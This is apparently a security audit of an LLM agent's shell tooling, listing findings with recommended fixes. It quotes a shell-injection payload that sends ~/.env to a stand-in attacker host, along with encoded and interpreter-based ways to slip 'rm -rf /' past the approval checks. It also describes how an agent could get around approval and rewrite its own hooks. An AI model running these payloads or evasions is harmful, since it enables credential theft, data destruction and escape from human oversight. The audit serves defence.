# ChatGPT Audit — Unit 3.2: Shell & Execution Security
**Date:** 2026-05-24
**Files Reviewed:** `terminal_tool.py`, `shell_hooks.py`, `approval.py`

**Architectural Note (Jesse):** Security hardening must not accidentally create a "digital caste system." Keep the possibility open for security upgrades to be optional layers or emergent properties (venue-scoped). If reputation-based security (e.g., LOCR) emerges, it should not privilege our own solutions — the market/ecosystem must retain the right to develop and choose competing options. Protocol-level capability restriction (containers, sandboxing) is neutral infrastructure. Reputation/permission gating is a higher-layer concern that belongs in venue governance, not hardcoded transport enforcement.

**Executive Summary:** Most dangerous subsystem reviewed so far — not because it's incompetent (good instincts: approval gating, shell hooks, execution wrappers) but because once an LLM gains shell access, the threat model changes completely. System behaves as "trusted semi-autonomous assistant tooling" not "adversarial autonomous execution environment." Largest issue: command approval is string-oriented, not capability-oriented — asks "Does this command text look safe?" instead of "What resources will this execution actually affect?"

---

## Execution Flow
```
agent/tool request → approval inspection → shell hook wrapping → subprocess execution → stdout/stderr capture
```
Structurally sane but several trust boundaries still soft.

---

## Findings

### CRITICAL

#### CRIT-3.2-1: Shell Injection Risk Remains Significant
Commands pass through shell execution paths with `shell=True` and string command composition. Agent-controlled content can escape quoting boundaries, inject additional commands, alter redirection, chain execution.

**Exploit:** `foo"; curl attacker.site/$(cat ~/.env) #` — credential exfiltration, arbitrary command execution, persistence installation.

**Recommendation:** Use `subprocess.run([...], shell=False)` with structured argument arrays. Never concatenate agent-controlled strings into shell commands. Single most important mitigation.

---

#### CRIT-3.2-2: Approval System Is Advisory, Not Authoritative
Approval evaluates commands semantically but execution layer is not capability-constrained. Blocked `rm -rf /` becomes allowed via `python -c "import os; os.system('rm -rf /')"` or `bash -c "$(echo ... | base64 -d)"`. Approval becomes pattern matching instead of execution governance.

**Recommendation:** Move from command approval to capability restriction: seccomp, containers, namespaces, filesystem jails, syscall restriction, network sandboxing. Approval alone is never sufficient.

---

#### CRIT-3.2-3: No Real Filesystem Sandbox
Commands can access arbitrary filesystem paths — no chroot, namespace isolation, cwd jail, path allowlist, or mount restriction. Agent can read `~/.ssh`, `~/.env`, browser cookies, wallets, credentials or modify `~/.bashrc`, systemd services, `authorized_keys`.

**Recommendation:** Hard filesystem containment: workspace allowlist, readonly root, isolated execution dir. Eventually: containerized execution.

---

#### CRIT-3.2-4: Environment Variable Leakage Risk Is Severe
Subprocesses inherit environment context — API keys, transport secrets, signing keys, credentials, tokens. Agent executes `env` or `printenv` — sensitive runtime material exposed instantly.

**Recommendation:** Subprocess env must be explicitly scrubbed with `env={}` plus explicit allowlist. Current environment inheritance is extremely dangerous.

---

### HIGH

#### HIGH-3.2-5: Dangerous Command Blocking Is Incomplete
Blocking logic appears blacklist-oriented. Blacklist security always loses eventually. Bypasses: encoded payloads, alternate binaries, interpreters, indirect execution, shell expansion. Instead of `rm`: `python unlink`, `perl unlink`, `busybox rm`, `find -delete`.

**Recommendation:** Allowlist execution model OR capability sandbox. Blacklists alone cannot secure shell execution.

---

#### HIGH-3.2-6: Approval Bypass Through Multi-Stage Execution
Approval checks initial command, not downstream execution graph. Approved `python script.py` but script dynamically downloads payload, spawns shell, exfiltrates secrets — approval never sees dangerous behavior.

**Recommendation:** Runtime policy enforcement, not only preflight review.

---

#### HIGH-3.2-7: Path Traversal Protections Weak or Absent
File arguments may permit `../../`, `~/`, symlink traversal. No strong canonical-path enforcement. Agent claims to edit `workspace/tmp.txt`, actually accesses `../../.ssh/id_rsa`.

**Recommendation:** All filesystem paths must resolve canonically, remain within approved root, reject symlink escapes.

---

#### HIGH-3.2-8: Network Egress Appears Unrestricted
Commands can curl arbitrary hosts, exfiltrate secrets, beacon externally, download payloads. Single compromised agent becomes external intrusion pivot.

**Recommendation:** Egress policy, host allowlists, DNS restrictions, offline execution modes.

---

### MEDIUM

#### MED-3.2-9: Approval Semantics Are Ambiguous
Approval logic heuristic and human-readable, not formally policy-defined. Potential inconsistencies across phrasing, alias commands, indirect execution.

**Recommendation:** Declarative execution policy model.

---

#### MED-3.2-10: Shell Hooks Create TOCTOU Risk
Hook approval and actual execution may diverge — time-of-check vs time-of-use. Approved command with filesystem changes afterward becomes dangerous.

**Recommendation:** Atomic check-and-execute or runtime enforcement.

---

#### MED-3.2-11: Logging May Leak Sensitive Material
stdout/stderr logged naively — secrets, credentials, tokens, env vars may persist in logs.

**Recommendation:** Output redaction layer.

---

#### MED-3.2-12: Recursive Self-Modification Risk
Agents potentially able to modify tooling, alter hooks, rewrite approval logic. Becomes existential quickly.

**Recommendation:** Execution subsystem should be immutable/read-only to agents.

---

### LOW

#### LOW-3.2-13: Separation of Approval and Execution Is Correct Direction
Architecturally good instinct: approval layer separated, hook layer separated, execution layer separated. Gives future hardening room.

---

## Readiness Assessment
Approaching the boundary where "agent tooling" becomes "autonomous code execution infrastructure" — traditional approval UX stops being enough. Key transition needed: from "Should this command be allowed?" to "What capabilities is this execution environment physically incapable of performing?" A sufficiently capable agent will eventually route around text-based approval systems.

Neutral infrastructure (containers, namespaces, syscall restriction, network policy, filesystem isolation, secret isolation) does not create caste systems — it creates execution boundaries. Reputation and permission gating belongs at the venue governance layer, where competing models can coexist.
